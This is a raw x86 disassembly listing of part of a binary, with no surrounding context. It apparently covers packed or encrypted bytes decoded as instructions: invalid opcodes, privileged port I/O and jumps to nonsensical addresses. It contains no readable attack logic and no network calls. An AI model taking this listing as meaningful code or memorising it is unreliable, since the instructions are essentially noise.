  40b775:	and    DWORD PTR [edx+0x65dc64f6],edi
  40b77b:	icebp  
  40b77c:	adc    al,0x2e
  40b77e:	jge    0x40b711
  40b780:	mov    bh,0x99
  40b782:	jb     0x40b763
  40b784:	outs   dx,DWORD PTR ds:[esi]
  40b785:	push   0x4336c6b2
  40b78a:	or     cl,BYTE PTR [ecx-0x621a5ec4]
  40b790:	sahf   
  40b791:	sub    ebp,DWORD PTR [esi+0x1f]
  40b794:	leave  
  40b795:	imul   ecx,DWORD PTR [ebx],0x1e55c68b
  40b79b:	js     0x40b7cb
  40b79d:	pusha  
  40b79e:	aaa    
  40b79f:	jbe    0x40b73f
  40b7a1:	push   ebx
  40b7a2:	sub    edx,ebx
  40b7a4:	in     al,dx
  40b7a5:	fnstsw WORD PTR [eax+0x4d3a195]
  40b7ab:	stc    
  40b7ac:	enter  0xe871,0x7a
  40b7b0:	jbe    0x40b7d9
  40b7b2:	xchg   ebp,eax
  40b7b3:	ficom  WORD PTR [eax+ebp*2]
  40b7b6:	pushf  
  40b7b7:	push   esp
  40b7b8:	xchg   esi,eax
  40b7b9:	stos   BYTE PTR es:[edi],al
  40b7ba:	popa   
  40b7bb:	and    DWORD PTR ds:0x54e40dde,edi
  40b7c1:	jmp    0xf80c85a
  40b7c6:	cli    
  40b7c7:	or     esp,ebx
  40b7c9:	push   edi
  40b7ca:	xor    al,0x25
  40b7cc:	and    al,0xe
  40b7ce:	clc    
  40b7cf:	ins    BYTE PTR es:[edi],dx
  40b7d0:	enter  0x1b60,0x54
  40b7d4:	jbe    0x40b7be
  40b7d6:	add    eax,0x351d52f8
  40b7db:	jle    0x40b814
  40b7dd:	jb     0x40b847
  40b7df:	mov    esi,ds
  40b7e1:	outs   dx,DWORD PTR ds:[esi]
  40b7e2:	gs or  eax,0x56b02cde
  40b7e8:	sub    BYTE PTR [esi-0x6a6d111e],0x21
  40b7ef:	jg     0x40b7f1
  40b7f1:	xchg   ebx,eax
  40b7f2:	ins    DWORD PTR es:[edi],dx
  40b7f3:	aad    0x50
  40b7f5:	lahf   
  40b7f6:	outs   dx,DWORD PTR ds:[esi]
  40b7f7:	es outs dx,BYTE PTR ds:[esi]
  40b7fa:	xor    eax,0x65dda5df
  40b7ff:	hlt    
  40b800:	loop   0x40b795
  40b802:	fsubp  st(5),st
  40b804:	push   ds
  40b805:	xchg   DWORD PTR [esp+edx*2+0x1df1466d],ecx
  40b80c:	xchg   ebp,eax
  40b80d:	sub    edx,DWORD PTR [ecx+0x5c]
  40b810:	jo     0x40b7df
  40b812:	cmp    al,0x1
  40b814:	ins    BYTE PTR es:[edi],dx
  40b815:	test   DWORD PTR [ecx+0x5c14b23a],edi
  40b81b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b81c:	les    edi,FWORD PTR [edx+0x1d]
  40b81f:	repnz dec ebp
  40b821:	mov    ch,ah
  40b823:	or     al,0x1a
  40b825:	push   edi
  40b826:	jbe    0x40b7fe
  40b828:	out    dx,al
  40b829:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b82a:	push   ecx
  40b82b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b82c:	mov    esi,0x7014687f
  40b831:	es (bad) 
  40b833:	stc    
  40b834:	fcomip st,st(2)
  40b836:	sbb    BYTE PTR [eax],cl
  40b838:	or     eax,0x7c464fa1
  40b83d:	jge    0x40b80e
  40b83f:	ror    BYTE PTR [edi+0x3],0x67
  40b843:	es arpl ax,si
  40b846:	enter  0x4deb,0x9
  40b84a:	pop    es
  40b84b:	push   ss
  40b84c:	mov    eax,0x2512a820
  40b851:	push   esi
  40b852:	ins    DWORD PTR es:[edi],dx
  40b853:	test   al,0x11
  40b855:	data16 int 0x39
  40b858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b859:	shl    BYTE PTR [ecx],1
  40b85b:	adc    al,BYTE PTR [ecx]
  40b85d:	int3   
  40b85e:	jp     0x40b85f
  40b860:	leave  
  40b861:	jp     0x40b83b
  40b863:	ror    DWORD PTR ds:0x2d84995d,0x3d
  40b86a:	inc    ecx
  40b86b:	int3   
  40b86c:	lds    eax,FWORD PTR [ebx+0x4]
  40b86f:	mov    ebp,eax
  40b871:	xor    BYTE PTR [ebx-0x2f],al
  40b874:	leave  
  40b875:	pop    es
  40b876:	jns    0x40b852
  40b878:	push   ebx
  40b879:	mov    esi,0x69216cd7
  40b87e:	rol    cl,0xfe
  40b881:	xor    DWORD PTR [edi-0x66],ebp
  40b884:	add    al,0x3a
  40b886:	sbb    BYTE PTR [edi-0x745aa81d],dl
  40b88c:	popa   
  40b88d:	outs   dx,DWORD PTR ds:[esi]
  40b88e:	imul   esp,DWORD PTR gs:[ecx+0x5f],0xb
  40b893:	cmp    BYTE PTR [edi],bh
  40b895:	mov    ah,0x5a
  40b897:	scas   eax,DWORD PTR es:[edi]
  40b898:	pop    ebp
  40b899:	addr16 ss and eax,0x6e
  40b89e:	cmp    esp,ebp
  40b8a0:	or     al,0xe3
  40b8a2:	mov    esp,0x966c4600
  40b8a7:	sub    bh,cl
  40b8a9:	or     DWORD PTR [edi],0x7d4317bf
  40b8af:	jle    0x40b867
  40b8b1:	outs   dx,DWORD PTR ds:[esi]
  40b8b2:	sbb    al,0x11
  40b8b4:	icebp  
  40b8b5:	(bad)  
  40b8b6:	int3   
  40b8b7:	push   ebx
  40b8b8:	xchg   BYTE PTR ds:[ecx+0x3f],bl
  40b8bc:	or     DWORD PTR [ecx+0x61fdd39f],ebp
  40b8c2:	mov    bl,0xc7
  40b8c4:	sub    BYTE PTR [edi+ecx*2+0x58],0x5
  40b8c9:	xor    esi,ebp
  40b8cb:	dec    ecx
  40b8cc:	ret    0x31af
  40b8cf:	mov    edi,0xb24b0923
  40b8d4:	xor    edi,eax
  40b8d6:	sub    eax,0x38721829
  40b8db:	div    DWORD PTR [ebx]
  40b8dd:	push   0x6b
  40b8df:	leave  
  40b8e0:	adc    eax,0xc7650602
  40b8e5:	(bad)  
  40b8e6:	(bad)  [ebp+edi*2-0x563ce44]
  40b8ed:	sbb    ebx,DWORD PTR [eax-0x7f]
  40b8f0:	in     eax,dx
  40b8f1:	sar    ecx,0x35
  40b8f4:	(bad)  
  40b8f5:	outs   dx,BYTE PTR ds:[esi]
  40b8f6:	test   DWORD PTR [ecx+ebx*4-0x29],ebx
  40b8fa:	rcl    DWORD PTR [edi-0x6eb27722],0xe9
  40b901:	push   0xd675e947
  40b906:	icebp  
  40b907:	mov    esp,fs
  40b909:	jge    0x40b8df
  40b90b:	cmp    esp,esi
  40b90d:	(bad)  
  40b90e:	lahf   
  40b90f:	xlat   BYTE PTR ds:[ebx]
  40b910:	push   esp
  40b911:	push   es
  40b912:	mov    bl,0x4
  40b914:	mov    edi,0x27b7e929
  40b919:	xor    al,0x8b
  40b91b:	mov    WORD PTR [ebp-0x26b511b9],cs
  40b921:	and    BYTE PTR ds:0x56c2a12d,ch
  40b927:	in     al,0xd4
  40b929:	into   
  40b92a:	pop    esp
  40b92b:	jbe    0x40b973
  40b92d:	test   DWORD PTR [ebx-0x6f9c689d],edx
  40b933:	leave  
  40b934:	dec    edi
  40b935:	inc    edx
  40b936:	mov    ecx,ss
  40b938:	in     eax,0x77
  40b93a:	pop    esi
  40b93b:	lods   al,BYTE PTR ds:[esi]
  40b93c:	add    al,ah
  40b93e:	mov    ah,0xfe
  40b940:	rcr    bh,0x4d
  40b943:	mov    esp,eax
  40b945:	push   ds
  40b946:	pop    edx
  40b947:	add    ch,ch
  40b949:	(bad)  
  40b94a:	xchg   ebp,eax
  40b94b:	sub    dl,BYTE PTR [ebp-0x3d]
  40b94e:	add    DWORD PTR [ecx+0x64],edi
  40b951:	cmp    al,dh
  40b953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b954:	or     eax,0x30009b19
  40b959:	cmp    eax,0xffc4ebd5
  40b95e:	in     eax,0x21
  40b960:	jb     0x40b96d
  40b962:	ret    0x2f56
  40b965:	or     DWORD PTR [edx+0x79569e7c],eax
  40b96b:	out    dx,al
  40b96c:	and    eax,0xa797c8d8
  40b971:	test   eax,0x9aee9ae8
  40b976:	test   DWORD PTR [edi+edi*1-0x54],esp
  40b97a:	std    
  40b97b:	or     ah,BYTE PTR [ebx]
  40b97d:	int3   
  40b97e:	dec    ebx
  40b97f:	sub    BYTE PTR [eax],0xe7
  40b982:	test   al,0x37
  40b984:	sbb    BYTE PTR [ebx+0x16b6db20],ah
  40b98a:	leave  
  40b98b:	pop    ebp
  40b98c:	mov    esi,0xa9b2263f
  40b991:	inc    edi
  40b992:	sbb    BYTE PTR ds:0x7d5e10eb,bl
  40b998:	jl     0x40b9e1
  40b99a:	jae    0x40b9a9
  40b99c:	mov    ah,0x69
  40b99e:	xor    DWORD PTR [esi-0x21],ecx
  40b9a1:	hlt    
  40b9a2:	cld    
  40b9a3:	adc    eax,0xedd2bd5f
  40b9a8:	fisttp QWORD PTR [ebx]
  40b9aa:	or     DWORD PTR [ecx-0x28ba336e],esi
  40b9b0:	dec    edx
  40b9b1:	add    ch,BYTE PTR [esi]
  40b9b3:	mov    esi,DWORD PTR [edi+0x8502f64]
  40b9b9:	out    0x97,al
  40b9bb:	fistp  WORD PTR [eax]
  40b9bd:	jg     0x40b94f
  40b9bf:	lock out 0x31,al
  40b9c2:	in     eax,0x1b
  40b9c4:	fisubr DWORD PTR [edx+0x5b]
  40b9c7:	(bad)  
  40b9c8:	mov    dl,0xe
  40b9ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9cb:	push   ds
  40b9cc:	scas   eax,DWORD PTR es:[edi]
  40b9cd:	pop    es
  40b9ce:	jp     0x40b9ef
  40b9d0:	inc    ebx
  40b9d1:	into   
  40b9d2:	push   ss
  40b9d3:	add    eax,0x81b4c9f2
  40b9d8:	retf   0xd4f0
  40b9db:	out    dx,eax
  40b9dc:	into   
  40b9dd:	cli    
  40b9de:	cld    
  40b9df:	lock mov al,0x13
  40b9e2:	sub    BYTE PTR [esi],ch
  40b9e4:	add    eax,0x88d7740c
  40b9e9:	dec    eax
  40b9ea:	test   BYTE PTR [ebp+eiz*4-0x30ac6ec4],dl
  40b9f1:	ja     0x40ba0c
  40b9f3:	push   es
  40b9f4:	jge    0x40b98b
  40b9f6:	in     al,dx
  40b9f7:	xchg   ecx,eax
  40b9f8:	or     DWORD PTR [ebx],ecx
  40b9fa:	jmp    0x40ba64
  40b9fc:	ins    DWORD PTR es:[edi],dx
  40b9fd:	cmp    eax,0xe0d693b5
  40ba02:	aas    
  40ba03:	sbb    eax,0x21fd401b
  40ba08:	pop    cx
  40ba0a:	mov    ebx,0x541017bf
  40ba0f:	mov    ds:0x21deb95b,al
  40ba14:	fistp  QWORD PTR [ecx+0x5e]
  40ba17:	sub    bh,BYTE PTR ds:0xe8911209
  40ba1d:	sub    BYTE PTR [edi+0x57],dl
  40ba20:	into   
  40ba21:	cld    
  40ba22:	int3   
  40ba23:	lds    ebp,FWORD PTR [eax+0x43]
  40ba26:	pop    edi
  40ba27:	push   ebx
  40ba28:	out    dx,eax
  40ba29:	pop    edi
  40ba2a:	dec    ecx
  40ba2b:	mov    esp,0x187e7e27
  40ba30:	xor    DWORD PTR [ecx],esi
  40ba32:	popa   
  40ba33:	adc    eax,0xc4500dff
  40ba38:	pop    esi
  40ba39:	adc    BYTE PTR [ecx],ah
  40ba3b:	shl    DWORD PTR [ecx],0x8a
  40ba3e:	ret    0xea9e
  40ba41:	pop    eax
  40ba42:	xchg   esp,eax
  40ba43:	xchg   ebx,eax
  40ba44:	and    DWORD PTR [edi-0x2282141a],edx
  40ba4a:	jl     0x40ba8a
  40ba4c:	push   edx
  40ba4d:	sub    eax,0xc1204a71
  40ba52:	setnp  BYTE PTR [ebx+eax*1]
  40ba56:	ja     0x40b9e4
  40ba58:	daa    
  40ba59:	pop    esi
  40ba5a:	push   esi
  40ba5b:	xor    ah,dl
  40ba5d:	mov    ah,0x45
  40ba5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba60:	xchg   esp,eax
  40ba61:	push   eax
  40ba62:	pop    eax
  40ba63:	xor    bl,BYTE PTR [ecx+0x5]
  40ba66:	loope  0x40bab5
  40ba68:	xchg   ecx,eax
  40ba69:	add    ch,BYTE PTR [esi+ecx*4-0x29]
  40ba6d:	and    eax,0xcb4d0bf2
  40ba72:	cdq    
  40ba73:	xlat   BYTE PTR ds:[ebx]
  40ba74:	and    DWORD PTR [ebx+ebp*4-0x299d8924],ebp
  40ba7b:	mov    al,ds:0x71cf6885
  40ba80:	(bad)  
  40ba81:	mov    esi,0x69d187fa
  40ba86:	xchg   DWORD PTR [ebx+0x2f],ebp
  40ba89:	sub    ch,al
  40ba8b:	test   BYTE PTR [esi+0x55012c08],ch
  40ba91:	pop    ecx
  40ba92:	mov    ch,0x33
  40ba94:	and    eax,0x7a2edc8
  40ba99:	(bad)  
  40ba9a:	call   0xee0fb0df
  40ba9f:	add    DWORD PTR [ebp-0x41],eax
  40baa2:	add    edx,DWORD PTR [eax+ecx*4]
  40baa5:	(bad)  [ebx-0x16]
  40baa8:	jge    0x40baa8
  40baaa:	out    0xed,al
  40baac:	jle    0x40ba9a
  40baae:	push   ebx
  40baaf:	(bad)  
  40bab0:	rol    eax,1
  40bab2:	sbb    esi,esp
  40bab4:	into   
  40bab5:	jg     0x40ba6e
  40bab7:	inc    eax
  40bab8:	mov    dl,0x34
  40baba:	fs xchg ecx,eax
  40babc:	lahf   
  40babd:	and    esp,DWORD PTR [ebx+0x774f4d03]
  40bac3:	mov    dh,0x60
  40bac5:	in     al,dx
  40bac6:	push   esp
  40bac7:	xor    bl,BYTE PTR [ebp+0x7d]
  40baca:	dec    esi
  40bacb:	adc    eax,0x6ec5b85c
  40bad0:	outs   dx,DWORD PTR ds:[esi]
  40bad1:	jp     0x40bace
  40bad3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bad4:	les    ebp,FWORD PTR [esi+0xa]
  40bad7:	xchg   edx,eax
  40bad8:	inc    ecx
  40bad9:	xlat   BYTE PTR ds:[ebx]
  40bada:	jg     0x40ba6e
  40badc:	or     BYTE PTR [eax+0x47],dl
  40badf:	push   ebx
  40bae0:	test   BYTE PTR [esi-0x1e],cl
  40bae3:	jmp    FWORD PTR [ecx-0x28]
  40bae6:	push   ecx
  40bae7:	xor    eax,DWORD PTR [ebx-0x4]
  40baea:	les    esp,FWORD PTR [edi]
  40baec:	in     eax,0xe2
  40baee:	mov    ch,dl
  40baf0:	daa    
  40baf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40baf2:	sar    DWORD PTR [ebx],cl
  40baf4:	loope  0x40bb68
  40baf6:	push   cs
  40baf7:	xlat   BYTE PTR ds:[ebx]
  40baf8:	dec    edx
  40baf9:	inc    ecx
  40bafa:	outs   dx,BYTE PTR ds:[esi]
  40bafb:	pop    ebx
  40bafc:	sar    bh,1
  40bafe:	pop    eax
  40baff:	dec    edi
  40bb00:	jle    0x40bb54
  40bb02:	pop    esp
  40bb03:	and    al,0xce
  40bb05:	sub    DWORD PTR [eax+0x58e02d46],ebp
  40bb0b:	into   
  40bb0c:	cli    
  40bb0d:	cmp    DWORD PTR [edi+0x13a454fd],edi
  40bb13:	or     DWORD PTR [edi-0x36],0x651ba28f
  40bb1a:	mov    edi,0xc1783567
  40bb1f:	jecxz  0x40bb05
  40bb21:	mov    ds:0x65386603,al
  40bb26:	loop   0x40bb1a
  40bb28:	sub    eax,0x2a348fd4
  40bb2d:	gs iret 
  40bb2f:	mov    al,ds:0x657e43a3
  40bb34:	mov    esi,0x3ff8285e
  40bb39:	jo     0x40bb27
  40bb3b:	std    
  40bb3c:	call   0x905c:0x2b2e6ae1
  40bb43:	in     al,dx
  40bb44:	xor    dl,cl
  40bb46:	mov    ah,0xa6
  40bb48:	sub    eax,0x9d94e105
  40bb4d:	or     al,0x56
  40bb4f:	fld    DWORD PTR [edx-0x4ba280a9]
  40bb55:	mov    ecx,0xabc2f884
  40bb5a:	mov    edx,0x613f772
  40bb5f:	and    eax,0xaae3c40d
  40bb64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb65:	push   0xffffffbc
  40bb67:	out    dx,al
  40bb68:	(bad)  
  40bb69:	nop
  40bb6a:	aam    0xe3
  40bb6c:	lods   eax,DWORD PTR ds:[esi]
  40bb6d:	inc    ecx
  40bb6e:	pop    es
  40bb6f:	fadd   DWORD PTR [edx]
  40bb71:	sahf   
  40bb72:	outs   dx,DWORD PTR ds:[esi]
  40bb73:	ss xchg edi,eax
  40bb75:	icebp  
  40bb76:	dec    ebx
  40bb77:	cmc    
  40bb78:	mov    eax,ds:0x37888336
  40bb7d:	mov    ch,0x70
  40bb7f:	dec    esp
  40bb80:	fwait
  40bb81:	popa   
  40bb82:	cdq    
  40bb83:	stos   DWORD PTR es:[edi],eax
  40bb84:	sbb    ch,dl
  40bb86:	in     al,dx
  40bb87:	jo     0x40bb6e
  40bb89:	shr    DWORD PTR ds:[esi+ecx*8+0x3e],cl
  40bb8e:	mov    esi,0xf84e7c62
  40bb93:	je     0x40bb65
  40bb95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb96:	(bad)  
  40bb97:	push   ebp
  40bb98:	mov    bl,0x83
  40bb9a:	les    ebp,FWORD PTR [esp+ecx*2+0x1cfe67eb]
  40bba1:	lahf   
  40bba2:	je     0x40bbfc
  40bba4:	loope  0x40bbad
  40bba6:	xchg   ecx,eax
  40bba7:	inc    eax
  40bba8:	lea    ebp,[ecx]
  40bbaa:	mov    WORD PTR [eax-0x415ed0f3],?
  40bbb0:	(bad)  
  40bbb1:	ror    BYTE PTR [ebp+0x75],1
  40bbb4:	xor    ah,BYTE PTR [esi]
  40bbb6:	out    0xf6,al
  40bbb8:	push   0xd27f35e9
  40bbbd:	pop    ds
  40bbbe:	xchg   ecx,eax
  40bbbf:	mov    eax,0x18badba7
  40bbc4:	xchg   edx,eax
  40bbc5:	add    BYTE PTR [edi-0x7a],ah
  40bbc8:	(bad)  
  40bbc9:	outs   dx,DWORD PTR ds:[esi]
  40bbca:	out    dx,eax
  40bbcb:	loop   0x40bb6e
  40bbcd:	out    0x8e,eax
  40bbcf:	(bad)  
  40bbd1:	dec    edx
  40bbd2:	jbe    0x40bbe6
  40bbd4:	pop    ebx
  40bbd5:	mov    cl,0x39
  40bbd7:	aam    0x39
  40bbd9:	imul   ebp,DWORD PTR [edi+edi*1-0x345b8417],0x24e8f943
  40bbe4:	adc    al,0xf8
  40bbe6:	dec    ecx
  40bbe7:	cld    
  40bbe8:	add    cl,BYTE PTR ds:0x4a400968
  40bbee:	and    ebp,DWORD PTR [ecx+0x34]
  40bbf1:	push   0x73b8eb7e
  40bbf6:	lock or BYTE PTR [ebp+ebp*2-0x33],bh
  40bbfb:	jbe    0x40bb84
  40bbfd:	adc    DWORD PTR [si+0x54],0x23
  40bc02:	xchg   edx,ecx
  40bc04:	ins    BYTE PTR es:[edi],dx
  40bc05:	sar    DWORD PTR [ebx-0x147729b5],0x1b
  40bc0c:	xor    BYTE PTR [ebx+0x4a],dl
  40bc0f:	das    
  40bc10:	mov    bh,0x2a
  40bc12:	aad    0xbb
  40bc14:	stos   DWORD PTR es:[edi],eax
  40bc15:	ja     0x40bbbe
  40bc17:	pop    eax
  40bc18:	cld    
  40bc19:	(bad)  
  40bc1a:	pop    esp
  40bc1b:	xchg   esi,eax
  40bc1c:	ss fdiv st(6),st
  40bc1f:	sub    eax,0xe25111cc
  40bc24:	aas    
  40bc25:	xchg   ebp,eax
  40bc26:	imul   DWORD PTR [ebp-0x630cf56]
  40bc2c:	je     0x40bc46
  40bc2e:	jmp    0xf246:0x2e7b1405
  40bc35:	loope  0x40bc4a
  40bc37:	jmp    0x40bc18
  40bc39:	jmp    0xe9f6:0xfb3a6323
  40bc40:	popa   
  40bc41:	ret    0xb2e6
  40bc44:	aad    0x27
  40bc46:	jnp    0x40bc05
  40bc48:	inc    edi
  40bc49:	test   eax,0xa119c1f
  40bc4e:	sub    BYTE PTR [edx+eiz*4+0x23],dl
  40bc52:	int3   
  40bc53:	ficom  WORD PTR [edi+0x3b]
  40bc56:	pop    ecx
  40bc57:	pop    eax
  40bc58:	mov    ecx,DWORD PTR [ebx*4-0x32362162]
  40bc5f:	mov    edi,0x98e3b53e
  40bc64:	xlat   BYTE PTR ds:[ebx]
  40bc65:	hlt    
  40bc66:	sbb    eax,0x232a6b5f
  40bc6b:	xlat   BYTE PTR ds:[ebx]
  40bc6c:	stos   BYTE PTR es:[edi],al
  40bc6d:	add    ebx,edx
  40bc6f:	mov    eax,0x892d77d3
  40bc74:	ja     0x40bce0
  40bc76:	out    dx,eax
  40bc77:	aas    
  40bc78:	cwde   
  40bc79:	call   0x34f1:0xd8d7ea36
  40bc80:	xor    DWORD PTR [edx+0x7],edx
  40bc83:	push   ebx
  40bc84:	test   al,0x5f
  40bc86:	sbb    BYTE PTR [ecx],ah
  40bc88:	les    ecx,FWORD PTR [eax-0x10]
  40bc8b:	xor    BYTE PTR [ecx],dl
  40bc8d:	scas   al,BYTE PTR es:[edi]
  40bc8e:	jmp    0x40bcbe
  40bc90:	retf   0x1b82
  40bc93:	arpl   WORD PTR [ebx-0x1f158dea],ax
  40bc99:	(bad)  
  40bc9a:	mov    eax,ds:0xfe576134
  40bc9f:	xchg   esp,eax
  40bca0:	jecxz  0x40bc9b
  40bca2:	xchg   BYTE PTR [edx],cl
  40bca4:	stc    
  40bca5:	lods   eax,DWORD PTR ds:[esi]
  40bca6:	jmp    0x40bd18
  40bca8:	xor    BYTE PTR [ebx-0x38ec4c68],bl
  40bcae:	minps  xmm7,XMMWORD PTR [eax+0x5caf37cc]
  40bcb5:	adc    BYTE PTR [ebx-0x2ff25982],0xc8
  40bcbc:	xlat   BYTE PTR ds:[ebx]
  40bcbd:	xor    al,0x67
  40bcc0:	adc    ah,BYTE PTR [edi-0x64a5e263]
  40bcc6:	rol    BYTE PTR [edi-0x37],cl
  40bcc9:	add    al,0xaf
  40bccb:	push   cs
  40bccc:	xchg   esp,eax
  40bccd:	test   BYTE PTR [eax],dh
  40bccf:	lds    eax,FWORD PTR [ebx-0x69]
  40bcd2:	dec    edx
  40bcd3:	cmp    ebx,ebx
  40bcd5:	mov    bh,0x5d
  40bcd7:	add    BYTE PTR [ebp-0x3423de2],bh
  40bcdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcde:	pushf  
  40bcdf:	mov    DWORD PTR [ebp-0x12396ab2],eax
  40bce5:	and    dh,BYTE PTR [ecx]
  40bce7:	je     0x40bcef
  40bce9:	xchg   BYTE PTR [ebp-0x21],bh
  40bcec:	adc    bh,cl
  40bcee:	into   
  40bcef:	dec    edx
  40bcf0:	push   ds
  40bcf1:	inc    ebx
  40bcf2:	sub    eax,0x73578f6d
  40bcf7:	add    al,0xad
  40bcf9:	lea    edx,[ecx]
  40bcfb:	in     al,dx
  40bcfc:	adc    cl,ah
  40bcfe:	stos   BYTE PTR es:[edi],al
  40bcff:	mov    edx,DWORD PTR [ecx]
  40bd01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd02:	and    esp,edi
  40bd04:	sti    
  40bd05:	inc    eax
  40bd06:	sub    bl,BYTE PTR [eax-0x2f]
  40bd09:	xchg   ecx,eax
  40bd0a:	test   DWORD PTR [ebx-0x46],ebx
  40bd0d:	sbb    eax,0xcf03ce75
  40bd12:	inc    edx
  40bd13:	fisub  WORD PTR [eax]
  40bd15:	xchg   esi,eax
  40bd16:	out    0xea,eax
  40bd18:	fnsave [edi-0x31]
  40bd1b:	mov    eax,0xbeada6e4
  40bd20:	enter  0xe008,0x94
  40bd24:	ror    BYTE PTR [edi-0x630f9309],0x8c
  40bd2b:	jbe    0x40bd86
  40bd2d:	pop    ss
  40bd2e:	pop    ds
  40bd2f:	and    DWORD PTR [ecx+edx*8+0x15c6e491],edi
  40bd36:	xor    BYTE PTR [eax],0x2d
  40bd39:	stos   DWORD PTR es:[edi],eax
  40bd3a:	cmp    DWORD PTR [edx],ecx
  40bd3c:	or     eax,0x48e223f5
  40bd41:	stos   BYTE PTR es:[edi],al
  40bd42:	faddp  st(2),st
  40bd44:	adc    eax,0xd43a95fa
  40bd49:	ret    0xc468
  40bd4c:	iret   
  40bd4d:	adc    cl,BYTE PTR [ebx+0x33]
  40bd50:	and    ch,bl
  40bd52:	sub    esp,DWORD PTR ds:0x2e4e2192
  40bd58:	sbb    al,0xcb
  40bd5a:	adc    al,BYTE PTR [ebx+0x4dc52c4b]
  40bd60:	test   eax,0x9f534e91
  40bd65:	sbb    DWORD PTR [edx-0x26],eax
  40bd68:	jbe    0x40bd2a
  40bd6a:	shl    BYTE PTR [esi-0x4a],1
  40bd6d:	iret   
  40bd6e:	adc    eax,0x59bdb39c
  40bd73:	sar    dl,1
  40bd75:	and    edi,esi
  40bd77:	cli    
  40bd78:	push   edi
  40bd79:	mov    esp,0xa855078c
  40bd7e:	bound  edi,QWORD PTR [ecx-0x33f55f51]
  40bd84:	push   0xffffff81
  40bd86:	cmp    al,0x51
  40bd88:	and    esp,DWORD PTR [edx]
  40bd8a:	stos   BYTE PTR es:[edi],al
  40bd8b:	pop    ecx
  40bd8c:	mov    DWORD PTR [esp+eax*8-0x57e75c9d],esi
  40bd93:	sub    eax,0x500bbb5e
  40bd98:	push   ds
  40bd99:	mov    eax,0x7a19f85a
  40bd9e:	cld    
  40bd9f:	retf   0xab96
  40bda2:	outs   dx,DWORD PTR ds:[esi]
  40bda3:	mov    dl,0x75
  40bda5:	xchg   edi,eax
  40bda6:	lahf   
  40bda7:	imul   DWORD PTR [ebx]
  40bda9:	data16 adc cl,BYTE PTR [edi+0x121e61af]
  40bdb0:	cld    
  40bdb1:	mov    al,0x23
  40bdb3:	or     BYTE PTR [eax],cl
  40bdb5:	xlat   BYTE PTR ds:[ebx]
  40bdb6:	mov    ch,0xba
  40bdb8:	xchg   edi,eax
  40bdb9:	jnp    0x40be10
  40bdbb:	adc    edx,edx
  40bdbd:	gs popf 
  40bdbf:	in     eax,dx
  40bdc0:	and    ah,cl
  40bdc2:	xchg   ebx,eax
  40bdc3:	cmp    esi,DWORD PTR [edi]
  40bdc5:	pusha  
  40bdc6:	cmp    bh,BYTE PTR [eax]
  40bdc8:	mov    ecx,0x9817c552
  40bdcd:	ret    
  40bdce:	int3   
  40bdcf:	and    BYTE PTR [edx+0x5f],0x8
  40bdd3:	(bad)  
  40bdd4:	jmp    0x510238ae
  40bdd9:	xchg   ecx,eax
  40bdda:	ds mov ch,0x27
  40bddd:	pop    eax
  40bdde:	sub    dh,BYTE PTR [ecx]
  40bde0:	loope  0x40bd80
  40bde2:	xor    al,0xfd
  40bde4:	xor    DWORD PTR [ecx+0x39bd36dc],ebx
  40bdea:	jbe    0x40bdad
  40bdec:	jnp    0x40bd76
  40bdee:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40bdf0:	loop   0x40bd92
  40bdf2:	mov    ah,bh
  40bdf4:	repz mov ds,WORD PTR [edx+0x2]
  40bdf8:	mov    ds:0x1d5bcece,al
  40bdfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdfe:	jo     0x40be0c
  40be00:	ret    0x8d3f
  40be03:	pop    ecx
  40be04:	sub    edx,DWORD PTR [edi-0x6f8ab20a]
  40be0a:	push   es
  40be0b:	push   ss
  40be0c:	pop    ebp
  40be0d:	mov    ecx,0xfc9521b0
  40be12:	jnp    0x40bdc3
  40be14:	retf   0x975d
  40be17:	cmp    DWORD PTR [eax+eiz*4+0x6dc87b2f],0x3a
  40be1f:	adc    al,0x24
  40be21:	inc    ax
  40be23:	mov    BYTE PTR [ecx+0x57],ch
  40be26:	xchg   edi,eax
  40be27:	call   0x173802dd
  40be2c:	loop   0x40be26
  40be2e:	test   BYTE PTR [edi-0x10700de0],dl
  40be34:	enter  0xeef7,0x80
  40be38:	sahf   
  40be39:	push   ds
  40be3a:	mov    al,0x3b
  40be3c:	xchg   esp,eax
  40be3d:	in     al,dx
  40be3e:	cmc    
  40be3f:	xchg   esp,eax
  40be40:	js     0x40bdda
  40be42:	push   esi
  40be43:	mov    edi,0xea1748dd
  40be48:	push   edx
  40be49:	cmp    edi,DWORD PTR [edi+0x2e8ac747]
  40be4f:	push   ebp
  40be50:	mov    esi,0xb860b8dd
  40be55:	loop   0x40bde2
  40be57:	xchg   DWORD PTR [esi-0x776c64],edi
  40be5d:	sbb    cl,0x45
  40be60:	mov    es,WORD PTR [esi+0x54200e56]
  40be66:	sub    esi,DWORD PTR [ecx+0x17]
  40be69:	clc    
  40be6a:	jo     0x40be92
  40be6c:	imul   DWORD PTR ds:[eax-0x186702aa]
  40be73:	sbb    eax,0xdb6dbc21
  40be78:	popa   
  40be79:	bound  ebp,QWORD PTR [esi]
  40be7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be7c:	jmp    0x1e949721
  40be81:	pop    eax
  40be82:	fabs   
  40be84:	dec    BYTE PTR [ecx+eax*2-0x50]
  40be88:	scas   al,BYTE PTR es:[edi]
  40be89:	xlat   BYTE PTR ds:[ebx]
  40be8a:	jmp    0x9564:0x34db3dbb
  40be91:	mov    BYTE PTR [ebp-0x3a],bl
  40be94:	test   al,0x51
  40be96:	ins    BYTE PTR es:[edi],dx
  40be97:	retf   0xd9fc
  40be9a:	es dec esp
  40be9c:	jns    0x40be92
  40be9e:	ficomp DWORD PTR [edx-0x22]
  40bea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bea2:	add    ecx,ebx
